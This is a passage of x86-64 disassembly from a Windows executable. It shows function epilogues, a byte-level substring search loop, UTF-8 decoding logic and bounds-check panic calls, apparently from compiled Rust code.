   1400028dc:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   1400028e3:	e8 48 e7 ff ff       	call   0x140001030
   1400028e8:	90                   	nop
   1400028e9:	48 83 c4 28          	add    $0x28,%rsp
   1400028ed:	5b                   	pop    %rbx
   1400028ee:	5f                   	pop    %rdi
   1400028ef:	5e                   	pop    %rsi
   1400028f0:	41 5c                	pop    %r12
   1400028f2:	41 5d                	pop    %r13
   1400028f4:	41 5e                	pop    %r14
   1400028f6:	41 5f                	pop    %r15
   1400028f8:	5d                   	pop    %rbp
   1400028f9:	c3                   	ret
   1400028fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002900:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002905:	55                   	push   %rbp
   140002906:	41 57                	push   %r15
   140002908:	41 56                	push   %r14
   14000290a:	41 55                	push   %r13
   14000290c:	41 54                	push   %r12
   14000290e:	56                   	push   %rsi
   14000290f:	57                   	push   %rdi
   140002910:	53                   	push   %rbx
   140002911:	48 83 ec 28          	sub    $0x28,%rsp
   140002915:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000291c:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140002920:	e8 eb e6 ff ff       	call   0x140001010
   140002925:	90                   	nop
   140002926:	48 83 c4 28          	add    $0x28,%rsp
   14000292a:	5b                   	pop    %rbx
   14000292b:	5f                   	pop    %rdi
   14000292c:	5e                   	pop    %rsi
   14000292d:	41 5c                	pop    %r12
   14000292f:	41 5d                	pop    %r13
   140002931:	41 5e                	pop    %r14
   140002933:	41 5f                	pop    %r15
   140002935:	5d                   	pop    %rbp
   140002936:	c3                   	ret
   140002937:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000293e:	00 00 
   140002940:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002945:	55                   	push   %rbp
   140002946:	41 57                	push   %r15
   140002948:	41 56                	push   %r14
   14000294a:	41 55                	push   %r13
   14000294c:	41 54                	push   %r12
   14000294e:	56                   	push   %rsi
   14000294f:	57                   	push   %rdi
   140002950:	53                   	push   %rbx
   140002951:	48 83 ec 28          	sub    $0x28,%rsp
   140002955:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000295c:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140002960:	e8 cb e6 ff ff       	call   0x140001030
   140002965:	90                   	nop
   140002966:	48 83 c4 28          	add    $0x28,%rsp
   14000296a:	5b                   	pop    %rbx
   14000296b:	5f                   	pop    %rdi
   14000296c:	5e                   	pop    %rsi
   14000296d:	41 5c                	pop    %r12
   14000296f:	41 5d                	pop    %r13
   140002971:	41 5e                	pop    %r14
   140002973:	41 5f                	pop    %r15
   140002975:	5d                   	pop    %rbp
   140002976:	c3                   	ret
   140002977:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000297e:	00 00 
   140002980:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002985:	55                   	push   %rbp
   140002986:	41 57                	push   %r15
   140002988:	41 56                	push   %r14
   14000298a:	41 55                	push   %r13
   14000298c:	41 54                	push   %r12
   14000298e:	56                   	push   %rsi
   14000298f:	57                   	push   %rdi
   140002990:	53                   	push   %rbx
   140002991:	48 83 ec 28          	sub    $0x28,%rsp
   140002995:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000299c:	48 8d 8d 70 02 00 00 	lea    0x270(%rbp),%rcx
   1400029a3:	e8 38 e7 ff ff       	call   0x1400010e0
   1400029a8:	90                   	nop
   1400029a9:	48 83 c4 28          	add    $0x28,%rsp
   1400029ad:	5b                   	pop    %rbx
   1400029ae:	5f                   	pop    %rdi
   1400029af:	5e                   	pop    %rsi
   1400029b0:	41 5c                	pop    %r12
   1400029b2:	41 5d                	pop    %r13
   1400029b4:	41 5e                	pop    %r14
   1400029b6:	41 5f                	pop    %r15
   1400029b8:	5d                   	pop    %rbp
   1400029b9:	c3                   	ret
   1400029ba:	cc                   	int3
   1400029bb:	cc                   	int3
   1400029bc:	cc                   	int3
   1400029bd:	cc                   	int3
   1400029be:	cc                   	int3
   1400029bf:	cc                   	int3
   1400029c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400029c4:	49 89 d1             	mov    %rdx,%r9
   1400029c7:	4c 63 c1             	movslq %ecx,%r8
   1400029ca:	48 8d 05 7f e7 ff ff 	lea    -0x1881(%rip),%rax        # 0x140001150
   1400029d1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029d6:	48 8d 15 33 f2 01 00 	lea    0x1f233(%rip),%rdx        # 0x140021c10
   1400029dd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400029e2:	e8 89 d8 00 00       	call   0x140010270
   1400029e7:	90                   	nop
   1400029e8:	48 83 c4 28          	add    $0x28,%rsp
   1400029ec:	c3                   	ret
   1400029ed:	cc                   	int3
   1400029ee:	cc                   	int3
   1400029ef:	cc                   	int3
   1400029f0:	41 57                	push   %r15
   1400029f2:	41 56                	push   %r14
   1400029f4:	41 55                	push   %r13
   1400029f6:	41 54                	push   %r12
   1400029f8:	56                   	push   %rsi
   1400029f9:	57                   	push   %rdi
   1400029fa:	55                   	push   %rbp
   1400029fb:	53                   	push   %rbx
   1400029fc:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   140002a03:	4c 89 c0             	mov    %r8,%rax
   140002a06:	49 89 d0             	mov    %rdx,%r8
   140002a09:	48 89 ca             	mov    %rcx,%rdx
   140002a0c:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002a11:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002a16:	49 89 c1             	mov    %rax,%r9
   140002a19:	e8 a2 9d 01 00       	call   0x14001c7c0
   140002a1e:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
   140002a23:	0f 85 7a 01 00 00    	jne    0x140002ba3
   140002a29:	4c 8b bc 24 98 00 00 	mov    0x98(%rsp),%r15
   140002a30:	00 
   140002a31:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140002a36:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002a3b:	4c 8b 5c 24 50       	mov    0x50(%rsp),%r11
   140002a40:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   140002a45:	49 83 ff ff          	cmp    $0xffffffffffffffff,%r15
   140002a49:	0f 84 8d 02 00 00    	je     0x140002cdc
   140002a4f:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140002a56:	00 
   140002a57:	4a 8d 04 21          	lea    (%rcx,%r12,1),%rax
   140002a5b:	48 83 c0 ff          	add    $0xffffffffffffffff,%rax
   140002a5f:	48 39 d0             	cmp    %rdx,%rax
   140002a62:	0f 83 97 03 00 00    	jae    0x140002dff
   140002a68:	49 8d 6c 24 ff       	lea    -0x1(%r12),%rbp
   140002a6d:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140002a72:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   140002a79:	00 
   140002a7a:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140002a7f:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140002a84:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   140002a89:	4c 89 e3             	mov    %r12,%rbx
   140002a8c:	48 89 ac 24 b0 00 00 	mov    %rbp,0xb0(%rsp)
   140002a93:	00 
   140002a94:	48 29 eb             	sub    %rbp,%rbx
   140002a97:	48 89 9c 24 a8 00 00 	mov    %rbx,0xa8(%rsp)
   140002a9e:	00 
   140002a9f:	4c 8b ac 24 88 00 00 	mov    0x88(%rsp),%r13
   140002aa6:	00 
   140002aa7:	4c 8b b4 24 98 00 00 	mov    0x98(%rsp),%r14
   140002aae:	00 
   140002aaf:	4c 89 cd             	mov    %r9,%rbp
   140002ab2:	48 f7 dd             	neg    %rbp
   140002ab5:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140002aba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002ac0:	41 0f b6 04 00       	movzbl (%r8,%rax,1),%eax
   140002ac5:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002aca:	48 0f a3 c5          	bt     %rax,%rbp
   140002ace:	73 50                	jae    0x140002b20
   140002ad0:	4d 39 f9             	cmp    %r15,%r9
   140002ad3:	4d 89 fa             	mov    %r15,%r10
   140002ad6:	4d 0f 47 d1          	cmova  %r9,%r10
   140002ada:	4d 39 e2             	cmp    %r12,%r10
   140002add:	4c 89 e7             	mov    %r12,%rdi
   140002ae0:	49 0f 47 fa          	cmova  %r10,%rdi
   140002ae4:	4b 8d 1c 13          	lea    (%r11,%r10,1),%rbx
   140002ae8:	4a 8d 2c 11          	lea    (%rcx,%r10,1),%rbp
   140002aec:	4c 29 d7             	sub    %r10,%rdi
   140002aef:	90                   	nop
   140002af0:	48 85 ff             	test   %rdi,%rdi
   140002af3:	74 5b                	je     0x140002b50
   140002af5:	48 39 d5             	cmp    %rdx,%rbp
   140002af8:	0f 83 53 03 00 00    	jae    0x140002e51
   140002afe:	0f b6 03             	movzbl (%rbx),%eax
   140002b01:	48 83 c3 01          	add    $0x1,%rbx
   140002b05:	48 8d 75 01          	lea    0x1(%rbp),%rsi
   140002b09:	48 83 c7 ff          	add    $0xffffffffffffffff,%rdi
   140002b0d:	41 3a 04 28          	cmp    (%r8,%rbp,1),%al
   140002b11:	48 89 f5             	mov    %rsi,%rbp
   140002b14:	74 da                	je     0x140002af0
   140002b16:	48 03 74 24 38       	add    0x38(%rsp),%rsi
   140002b1b:	49 89 f5             	mov    %rsi,%r13
   140002b1e:	eb 06                	jmp    0x140002b26
   140002b20:	4c 01 e1             	add    %r12,%rcx
   140002b23:	49 89 cd             	mov    %rcx,%r13
   140002b26:	45 31 f6             	xor    %r14d,%r14d
   140002b29:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002b2e:	4c 01 e8             	add    %r13,%rax
   140002b31:	4d 89 f7             	mov    %r14,%r15
   140002b34:	4c 89 e9             	mov    %r13,%rcx
   140002b37:	48 39 d0             	cmp    %rdx,%rax
   140002b3a:	72 84                	jb     0x140002ac0
   140002b3c:	e9 f2 02 00 00       	jmp    0x140002e33
   140002b41:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002b48:	00 00 00 
   140002b4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b50:	4c 89 c8             	mov    %r9,%rax
   140002b53:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002b5a:	00 00 00 
   140002b5d:	0f 1f 00             	nopl   (%rax)
   140002b60:	49 39 c7             	cmp    %rax,%r15
   140002b63:	0f 83 9a 02 00 00    	jae    0x140002e03
   140002b69:	48 83 c0 ff          	add    $0xffffffffffffffff,%rax
   140002b6d:	4c 39 e0             	cmp    %r12,%rax
   140002b70:	0f 83 10 03 00 00    	jae    0x140002e86
   140002b76:	4c 8d 14 08          	lea    (%rax,%rcx,1),%r10
   140002b7a:	49 39 d2             	cmp    %rdx,%r10
   140002b7d:	0f 83 27 03 00 00    	jae    0x140002eaa
   140002b83:	41 0f b6 1c 03       	movzbl (%r11,%rax,1),%ebx
   140002b88:	43 3a 1c 10          	cmp    (%r8,%r10,1),%bl
   140002b8c:	74 d2                	je     0x140002b60
   140002b8e:	48 03 8c 24 b0 00 00 	add    0xb0(%rsp),%rcx
   140002b95:	00 
   140002b96:	49 89 cd             	mov    %rcx,%r13
   140002b99:	4c 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%r14
   140002ba0:	00 
   140002ba1:	eb 86                	jmp    0x140002b29
   140002ba3:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002ba8:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002bad:	4c 8d 0c 11          	lea    (%rcx,%rdx,1),%r9
   140002bb1:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140002bb6:	80 7c 24 78 00       	cmpb   $0x0,0x78(%rsp)
   140002bbb:	41 0f 94 c2          	sete   %r10b
   140002bbf:	eb 15                	jmp    0x140002bd6
   140002bc1:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002bc8:	00 00 00 
   140002bcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002bd0:	49 01 c0             	add    %rax,%r8
   140002bd3:	45 31 d2             	xor    %r10d,%r10d
   140002bd6:	4d 85 c0             	test   %r8,%r8
   140002bd9:	74 16                	je     0x140002bf1
   140002bdb:	4c 39 c2             	cmp    %r8,%rdx
   140002bde:	74 11                	je     0x140002bf1
   140002be0:	0f 86 9c 03 00 00    	jbe    0x140002f82
   140002be6:	42 80 3c 01 bf       	cmpb   $0xbf,(%rcx,%r8,1)
   140002beb:	0f 8e 91 03 00 00    	jle    0x140002f82
   140002bf1:	4c 39 c2             	cmp    %r8,%rdx
   140002bf4:	0f 84 fd 01 00 00    	je     0x140002df7
   140002bfa:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   140002bfe:	0f b6 18             	movzbl (%rax),%ebx
   140002c01:	0f b6 fb             	movzbl %bl,%edi
   140002c04:	40 84 ff             	test   %dil,%dil
   140002c07:	0f 89 83 00 00 00    	jns    0x140002c90
   140002c0d:	48 8d 68 01          	lea    0x1(%rax),%rbp
   140002c11:	4c 39 cd             	cmp    %r9,%rbp
   140002c14:	74 3c                	je     0x140002c52
   140002c16:	0f b6 68 01          	movzbl 0x1(%rax),%ebp
   140002c1a:	48 83 c0 02          	add    $0x2,%rax
   140002c1e:	83 e5 3f             	and    $0x3f,%ebp
   140002c21:	89 fe                	mov    %edi,%esi
   140002c23:	83 e6 1f             	and    $0x1f,%esi
   140002c26:	40 80 ff e0          	cmp    $0xe0,%dil
   140002c2a:	72 36                	jb     0x140002c62
   140002c2c:	4c 39 c8             	cmp    %r9,%rax
   140002c2f:	74 38                	je     0x140002c69
   140002c31:	0f b6 38             	movzbl (%rax),%edi
   140002c34:	48 83 c0 01          	add    $0x1,%rax
   140002c38:	83 e7 3f             	and    $0x3f,%edi
   140002c3b:	c1 e5 06             	shl    $0x6,%ebp
   140002c3e:	09 fd                	or     %edi,%ebp
   140002c40:	80 fb f0             	cmp    $0xf0,%bl
   140002c43:	72 33                	jb     0x140002c78
   140002c45:	4c 39 c8             	cmp    %r9,%rax
   140002c48:	74 35                	je     0x140002c7f
   140002c4a:	0f b6 00             	movzbl (%rax),%eax
   140002c4d:	83 e0 3f             	and    $0x3f,%eax
   140002c50:	eb 2f                	jmp    0x140002c81
   140002c52:	31 ed                	xor    %ebp,%ebp
   140002c54:	4c 89 c8             	mov    %r9,%rax
   140002c57:	89 fe                	mov    %edi,%esi
   140002c59:	83 e6 1f             	and    $0x1f,%esi
   140002c5c:	40 80 ff e0          	cmp    $0xe0,%dil
   140002c60:	73 ca                	jae    0x140002c2c
   140002c62:	c1 e6 06             	shl    $0x6,%esi
   140002c65:	09 f5                	or     %esi,%ebp
   140002c67:	eb 25                	jmp    0x140002c8e
   140002c69:	31 ff                	xor    %edi,%edi
   140002c6b:	4c 89 c8             	mov    %r9,%rax
   140002c6e:	c1 e5 06             	shl    $0x6,%ebp
   140002c71:	09 fd                	or     %edi,%ebp
   140002c73:	80 fb f0             	cmp    $0xf0,%bl
   140002c76:	73 cd                	jae    0x140002c45
   140002c78:	c1 e6 0c             	shl    $0xc,%esi
   140002c7b:	09 f5                	or     %esi,%ebp
   140002c7d:	eb 0f                	jmp    0x140002c8e
   140002c7f:	31 c0                	xor    %eax,%eax
   140002c81:	83 e6 07             	and    $0x7,%esi
   140002c84:	c1 e6 12             	shl    $0x12,%esi
   140002c87:	c1 e5 06             	shl    $0x6,%ebp
   140002c8a:	09 f5                	or     %esi,%ebp
   140002c8c:	09 c5                	or     %eax,%ebp
   140002c8e:	89 ef                	mov    %ebp,%edi
   140002c90:	41 f6 c2 01          	test   $0x1,%r10b
   140002c94:	0f 84 83 01 00 00    	je     0x140002e1d
   140002c9a:	81 ff 00 00 11 00    	cmp    $0x110000,%edi
   140002ca0:	0f 84 59 01 00 00    	je     0x140002dff
   140002ca6:	b8 01 00 00 00       	mov    $0x1,%eax
   140002cab:	81 ff 80 00 00 00    	cmp    $0x80,%edi
   140002cb1:	0f 82 19 ff ff ff    	jb     0x140002bd0
   140002cb7:	b8 02 00 00 00       	mov    $0x2,%eax
   140002cbc:	81 ff 00 08 00 00    	cmp    $0x800,%edi
   140002cc2:	0f 82 08 ff ff ff    	jb     0x140002bd0
   140002cc8:	81 ff 00 00 01 00    	cmp    $0x10000,%edi
   140002cce:	b8 04 00 00 00       	mov    $0x4,%eax
   140002cd3:	48 83 d8 00          	sbb    $0x0,%rax
   140002cd7:	e9 f4 fe ff ff       	jmp    0x140002bd0
   140002cdc:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140002ce3:	00 
   140002ce4:	4a 8d 3c 21          	lea    (%rcx,%r12,1),%rdi
   140002ce8:	48 83 c7 ff          	add    $0xffffffffffffffff,%rdi
   140002cec:	48 39 d7             	cmp    %rdx,%rdi
   140002cef:	0f 83 0a 01 00 00    	jae    0x140002dff
   140002cf5:	4c 8b 6c 24 68       	mov    0x68(%rsp),%r13
   140002cfa:	4d 39 e5             	cmp    %r12,%r13
   140002cfd:	4d 89 e1             	mov    %r12,%r9
   140002d00:	4d 0f 47 cd          	cmova  %r13,%r9
   140002d04:	49 8d 44 24 ff       	lea    -0x1(%r12),%rax
   140002d09:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002d0e:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140002d15:	00 
   140002d16:	4d 8d 55 ff          	lea    -0x1(%r13),%r10
   140002d1a:	4d 39 e2             	cmp    %r12,%r10
   140002d1d:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140002d22:	0f 83 c0 01 00 00    	jae    0x140002ee8
   140002d28:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002d2d:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002d32:	4c 8b b4 24 88 00 00 	mov    0x88(%rsp),%r14
   140002d39:	00 
   140002d3a:	4b 8d 2c 2b          	lea    (%r11,%r13,1),%rbp
   140002d3e:	4f 8d 3c 28          	lea    (%r8,%r13,1),%r15
   140002d42:	4d 29 e9             	sub    %r13,%r9
   140002d45:	eb 1b                	jmp    0x140002d62
   140002d47:	4c 01 e1             	add    %r12,%rcx
   140002d4a:	49 89 ce             	mov    %rcx,%r14
   140002d4d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002d52:	49 8d 3c 06          	lea    (%r14,%rax,1),%rdi
   140002d56:	4c 89 f1             	mov    %r14,%rcx
   140002d59:	48 39 d7             	cmp    %rdx,%rdi
   140002d5c:	0f 83 e3 00 00 00    	jae    0x140002e45
   140002d62:	41 0f b6 04 38       	movzbl (%r8,%rdi,1),%eax
   140002d67:	48 0f a3 c6          	bt     %rax,%rsi
   140002d6b:	73 da                	jae    0x140002d47
   140002d6d:	49 8d 3c 0f          	lea    (%r15,%rcx,1),%rdi
   140002d71:	4a 8d 34 29          	lea    (%rcx,%r13,1),%rsi
   140002d75:	31 db                	xor    %ebx,%ebx
   140002d77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002d7e:	00 00 
   140002d80:	49 39 d9             	cmp    %rbx,%r9
   140002d83:	74 25                	je     0x140002daa
   140002d85:	48 8d 04 1e          	lea    (%rsi,%rbx,1),%rax
   140002d89:	48 39 d0             	cmp    %rdx,%rax
   140002d8c:	0f 83 d4 00 00 00    	jae    0x140002e66
   140002d92:	44 0f b6 54 1d 00    	movzbl 0x0(%rbp,%rbx,1),%r10d
   140002d98:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140002d9c:	44 3a 14 1f          	cmp    (%rdi,%rbx,1),%r10b
   140002da0:	48 89 c3             	mov    %rax,%rbx
   140002da3:	74 db                	je     0x140002d80
   140002da5:	48 01 c1             	add    %rax,%rcx
   140002da8:	eb 40                	jmp    0x140002dea
   140002daa:	48 8d 79 ff          	lea    -0x1(%rcx),%rdi
   140002dae:	4d 8d 14 08          	lea    (%r8,%rcx,1),%r10
   140002db2:	49 83 c2 ff          	add    $0xffffffffffffffff,%r10
   140002db6:	4c 89 ee             	mov    %r13,%rsi
   140002db9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002dc0:	48 85 f6             	test   %rsi,%rsi
   140002dc3:	74 50                	je     0x140002e15
   140002dc5:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   140002dc9:	48 39 d0             	cmp    %rdx,%rax
   140002dcc:	0f 83 f9 00 00 00    	jae    0x140002ecb
   140002dd2:	41 0f b6 44 33 ff    	movzbl -0x1(%r11,%rsi,1),%eax
   140002dd8:	48 8d 5e ff          	lea    -0x1(%rsi),%rbx
   140002ddc:	41 3a 04 32          	cmp    (%r10,%rsi,1),%al
   140002de0:	48 89 de             	mov    %rbx,%rsi
   140002de3:	74 db                	je     0x140002dc0
   140002de5:	48 03 4c 24 38       	add    0x38(%rsp),%rcx
   140002dea:	49 89 ce             	mov    %rcx,%r14
   140002ded:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140002df2:	e9 56 ff ff ff       	jmp    0x140002d4d
   140002df7:	b0 01                	mov    $0x1,%al
   140002df9:	41 f6 c2 01          	test   $0x1,%r10b
   140002dfd:	74 20                	je     0x140002e1f
   140002dff:	31 c0                	xor    %eax,%eax
   140002e01:	eb 1c                	jmp    0x140002e1f
   140002e03:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   140002e0a:	00 
   140002e0b:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140002e12:	00 
   140002e13:	eb 08                	jmp    0x140002e1d
   140002e15:	4c 89 b4 24 88 00 00 	mov    %r14,0x88(%rsp)
   140002e1c:	00 
   140002e1d:	b0 01                	mov    $0x1,%al
   140002e1f:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   140002e26:	5b                   	pop    %rbx
   140002e27:	5d                   	pop    %rbp
   140002e28:	5f                   	pop    %rdi
   140002e29:	5e                   	pop    %rsi
   140002e2a:	41 5c                	pop    %r12
   140002e2c:	41 5d                	pop    %r13
   140002e2e:	41 5e                	pop    %r14
   140002e30:	41 5f                	pop    %r15
   140002e32:	c3                   	ret
   140002e33:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   140002e3a:	00 
   140002e3b:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140002e42:	00 
   140002e43:	eb ba                	jmp    0x140002dff
   140002e45:	4c 89 b4 24 88 00 00 	mov    %r14,0x88(%rsp)
   140002e4c:	00 
   140002e4d:	31 c0                	xor    %eax,%eax
   140002e4f:	eb ce                	jmp    0x140002e1f
   140002e51:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   140002e58:	00 
   140002e59:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140002e60:	00 
   140002e61:	4c 01 d1             	add    %r10,%rcx
   140002e64:	eb 0b                	jmp    0x140002e71
   140002e66:	4c 89 b4 24 88 00 00 	mov    %r14,0x88(%rsp)
   140002e6d:	00 
   140002e6e:	4c 01 e9             	add    %r13,%rcx
   140002e71:	48 39 d1             	cmp    %rdx,%rcx
   140002e74:	48 0f 42 ca          	cmovb  %rdx,%rcx
   140002e78:	4c 8d 05 e9 e9 01 00 	lea    0x1e9e9(%rip),%r8        # 0x140021868
   140002e7f:	e8 fc cb 01 00       	call   0x14001fa80
   140002e84:	0f 0b                	ud2
   140002e86:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   140002e8d:	00 
   140002e8e:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140002e95:	00 
   140002e96:	4c 8d 05 e3 e9 01 00 	lea    0x1e9e3(%rip),%r8        # 0x140021880
   140002e9d:	48 89 c1             	mov    %rax,%rcx
   140002ea0:	4c 89 e2             	mov    %r12,%rdx
   140002ea3:	e8 d8 cb 01 00       	call   0x14001fa80
   140002ea8:	0f 0b                	ud2
   140002eaa:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   140002eb1:	00 
   140002eb2:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140002eb9:	00 
   140002eba:	4c 8d 05 d7 e9 01 00 	lea    0x1e9d7(%rip),%r8        # 0x140021898
   140002ec1:	4c 89 d1             	mov    %r10,%rcx
   140002ec4:	e8 b7 cb 01 00       	call   0x14001fa80
   140002ec9:	0f 0b                	ud2
   140002ecb:	4c 89 b4 24 88 00 00 	mov    %r14,0x88(%rsp)
   140002ed2:	00 
   140002ed3:	48 01 f1             	add    %rsi,%rcx
   140002ed6:	48 83 c1 ff          	add    $0xffffffffffffffff,%rcx
   140002eda:	4c 8d 05 b7 e9 01 00 	lea    0x1e9b7(%rip),%r8        # 0x140021898
   140002ee1:	e8 9a cb 01 00       	call   0x14001fa80
   140002ee6:	0f 0b                	ud2
   140002ee8:	4c 8b bc 24 88 00 00 	mov    0x88(%rsp),%r15
   140002eef:	00 
   140002ef0:	4d 01 eb             	add    %r13,%r11
   140002ef3:	4f 8d 34 28          	lea    (%r8,%r13,1),%r14
   140002ef7:	4d 29 e9             	sub    %r13,%r9
   140002efa:	41 0f b6 04 38       	movzbl (%r8,%rdi,1),%eax
   140002eff:	48 0f a3 c6          	bt     %rax,%rsi
   140002f03:	73 2e                	jae    0x140002f33
   140002f05:	49 8d 3c 0e          	lea    (%r14,%rcx,1),%rdi
   140002f09:	4a 8d 34 29          	lea    (%rcx,%r13,1),%rsi
   140002f0d:	31 ed                	xor    %ebp,%ebp
   140002f0f:	49 39 e9             	cmp    %rbp,%r9
   140002f12:	74 47                	je     0x140002f5b
   140002f14:	48 8d 04 2e          	lea    (%rsi,%rbp,1),%rax
   140002f18:	48 39 d0             	cmp    %rdx,%rax
   140002f1b:	73 7b                	jae    0x140002f98
   140002f1d:	41 0f b6 1c 2b       	movzbl (%r11,%rbp,1),%ebx
   140002f22:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140002f26:	3a 1c 2f             	cmp    (%rdi,%rbp,1),%bl
   140002f29:	48 89 c5             	mov    %rax,%rbp
   140002f2c:	74 e1                	je     0x140002f0f
   140002f2e:	48 01 c1             	add    %rax,%rcx
   140002f31:	eb 03                	jmp    0x140002f36
   140002f33:	4c 01 e1             	add    %r12,%rcx
   140002f36:	49 89 cf             	mov    %rcx,%r15
   140002f39:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002f3e:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   140002f42:	48 39 d7             	cmp    %rdx,%rdi
   140002f45:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140002f4a:	72 ae                	jb     0x140002efa
   140002f4c:	4c 89 bc 24 88 00 00 	mov    %r15,0x88(%rsp)
   140002f53:	00 
   140002f54:	31 c0                	xor    %eax,%eax
   140002f56:	e9 c4 fe ff ff       	jmp    0x140002e1f
   140002f5b:	4c 89 bc 24 88 00 00 	mov    %r15,0x88(%rsp)
   140002f62:	00 
   140002f63:	b0 01                	mov    $0x1,%al
   140002f65:	4d 85 ed             	test   %r13,%r13
   140002f68:	0f 84 b1 fe ff ff    	je     0x140002e1f
   140002f6e:	4c 8d 05 0b e9 01 00 	lea    0x1e90b(%rip),%r8        # 0x140021880
   140002f75:	4c 89 d1             	mov    %r10,%rcx
   140002f78:	4c 89 e2             	mov    %r12,%rdx
   140002f7b:	e8 00 cb 01 00       	call   0x14001fa80
   140002f80:	0f 0b                	ud2
   140002f82:	48 8d 05 27 e9 01 00 	lea    0x1e927(%rip),%rax        # 0x1400218b0
   140002f89:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f8e:	49 89 d1             	mov    %rdx,%r9
   140002f91:	e8 4a cd 01 00       	call   0x14001fce0
   140002f96:	0f 0b                	ud2
   140002f98:	4c 89 bc 24 88 00 00 	mov    %r15,0x88(%rsp)
   140002f9f:	00 
   140002fa0:	e9 c9 fe ff ff       	jmp    0x140002e6e
   140002fa5:	cc                   	int3
   140002fa6:	cc                   	int3
   140002fa7:	cc                   	int3
   140002fa8:	cc                   	int3
   140002fa9:	cc                   	int3
   140002faa:	cc                   	int3
   140002fab:	cc                   	int3
   140002fac:	cc                   	int3
   140002fad:	cc                   	int3
   140002fae:	cc                   	int3
   140002faf:	cc                   	int3
   140002fb0:	55                   	push   %rbp
   140002fb1:	41 57                	push   %r15
   140002fb3:	41 56                	push   %r14
   140002fb5:	41 55                	push   %r13
   140002fb7:	41 54                	push   %r12
   140002fb9:	56                   	push   %rsi
   140002fba:	57                   	push   %rdi
   140002fbb:	53                   	push   %rbx
   140002fbc:	48 81 ec a8 04 00 00 	sub    $0x4a8,%rsp
   140002fc3:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140002fca:	00 
   140002fcb:	0f 29 b5 10 04 00 00 	movaps %xmm6,0x410(%rbp)
   140002fd2:	48 c7 85 08 04 00 00 	movq   $0xfffffffffffffffe,0x408(%rbp)
   140002fd9:	fe ff ff ff 
   140002fdd:	4d 89 ce             	mov    %r9,%r14
   140002fe0:	4c 89 c7             	mov    %r8,%rdi
   140002fe3:	e8 18 02 00 00       	call   0x140003200
   140002fe8:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002fed:	89 c2                	mov    %eax,%edx
   140002fef:	e8 84 b7 01 00       	call   0x14001e778
